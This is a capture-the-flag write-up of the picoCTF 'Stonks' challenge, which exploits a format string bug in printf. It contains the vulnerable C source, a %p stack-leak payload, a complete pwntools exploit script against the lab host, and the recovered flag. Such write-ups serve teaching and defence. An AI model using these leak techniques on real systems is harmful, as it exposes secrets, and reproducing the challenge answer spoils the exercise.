# Stonks — Format String Stack Disclosure

**Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Easy (CyLab 2)  
**Tools:** `file`, `checksec`, GDB with `pwndbg`, Python 3 (`pwntools`)  
**Binary:** 32-bit ELF provided with source code `vuln.c`  

---

## TL;DR

A classic and clean introduction to **Format String Vulnerabilities**. The program reads an API token/flag from disk directly into a local stack buffer (`char api_buf[128]`), then passes user-controlled input directly to `printf(user_buf)` without a format specifier. By providing a sequence of `%p` specifiers, we leak memory words upwards along the stack. Decoding these 32/64-bit hexadecimal values into little-endian ASCII characters recovers the flag in plaintext without needing any memory corruption.

---

## Student's Learning Note: How `printf()` Walks the Stack

In C, variadic functions like `printf(const char *format, ...)` do not inherently know how many arguments were passed to them at compile time. Instead, the function parses the format string at runtime:
* Every time it encounters a `%p` or `%x`, it fetches the next 4 or 8 bytes from the stack (or argument registers), assuming the caller placed an argument there.
* If a developer writes `printf(user_buf);` instead of `printf("%s", user_buf);`, an attacker supplying `%p.%p.%p...` forces `printf` to walk further up the stack frame, reading and printing whatever data happens to reside there (local variables, saved pointers, canaries, or secret keys).

---

## Source Code Review & Vulnerability

Looking into `vuln.c`:

```c
int buy_stonks(Portfolio *p) {
    char api_buf[FLAG_BUFFER]; // [Stack local variable]
    FILE *f = fopen("api", "r");
    if (!f) {
        printf("Flag file is missing. Please contact an admin.\n");
        exit(1);
    }
    fgets(api_buf, FLAG_BUFFER, f); // Reads the secret flag into api_buf on the stack!

    char *user_buf = malloc(300 + 1);
    printf("What is your API token?\n");
    scanf("%300s", user_buf);

    printf("Buying stonks with token:\n");
    printf(user_buf); // <-- CRITICAL VULNERABILITY: Missing format specifier!
    ...
}
```

Because `api_buf` is allocated on the stack frame of `buy_stonks()`, it sits right within reach of `printf`'s variadic pointer dereferencing.

---

## Exploitation: Memory Dumping & Endianness Reversal

When we input `%p.%p.%p...` into the token prompt, `printf` prints memory words in hex. For example:

```text
0x64616361.0x7b796d65.0x306c5f49...
```

Because x86 architectures are **little-endian**, multi-byte integers store the least significant byte at the lowest memory address:
* `0x64616361` $\rightarrow$ bytes `[0x61, 0x63, 0x61, 0x64]` $\rightarrow$ `"acad"`
* `0x7b796d65` $\rightarrow$ bytes `[0x65, 0x6d, 0x79, 0x7b]` $\rightarrow$ `"emy{"`
* `0x306c5f49` $\rightarrow$ bytes `[0x49, 0x5f, 0x6c, 0x30]` $\rightarrow$ `"I_l0"`

Concatenating and reversing the endianness of these leaked words reveals the flag.

---

## Exploit Script

```python
#!/usr/bin/env python3
import re
from pwn import *

context.log_level = "error"

HOST = "xebec.cylabacademy.net"
PORT = 34149

def main():
    p = remote(HOST, PORT)

    # Navigate menu: 1) Buy some stonks!
    p.recvuntil(b"2) View my portfolio")
    p.sendline(b"1")

    # Send format string payload to dump stack values
    p.recvuntil(b"API token?")
    p.sendline(b".".join([b"%p"] * 100))

    data = p.recvall(timeout=5)
    p.close()

    # Parse and decode hexadecimal leaked words
    decoded_bytes = b""
    for word in re.findall(rb"0x[0-9a-f]+|\(nil\)", data):
        if word == b"(nil)":
            decoded_bytes += b"\x00" * 4
        else:
            hex_val = int(word, 16)
            decoded_bytes += hex_val.to_bytes(4, "little")

    match = re.search(rb"[A-Za-z0-9_]{3,}\{[ -~]+\}", decoded_bytes)
    if match:
        print(f"[+] Flag found: {match.group(0).decode()}")
    else:
        print("[-] Flag not found in dump.")

if __name__ == "__main__":
    main()
```

*(See [`exploit.py`](exploit.py) for the complete script).*

---

## Flag & Key Takeaways

```text
academy{I_l05t_4ll_my_m0n3y_13f8cb62}
```

1. **Never Pass Variable Strings as the First Argument to `printf`:** Always use `printf("%s", str)` to ensure the string content is treated strictly as data, not instructions.
2. **Understand Endianness in Leaked Words:** Data read as 32-bit words (`%x` / `%p`) appears in reverse byte order on little-endian processors when converted directly to characters.
3. **Format Strings Can Read and Write:** While this challenge only required memory disclosure (`%p`), format strings can also achieve arbitrary write primitives using `%n`.
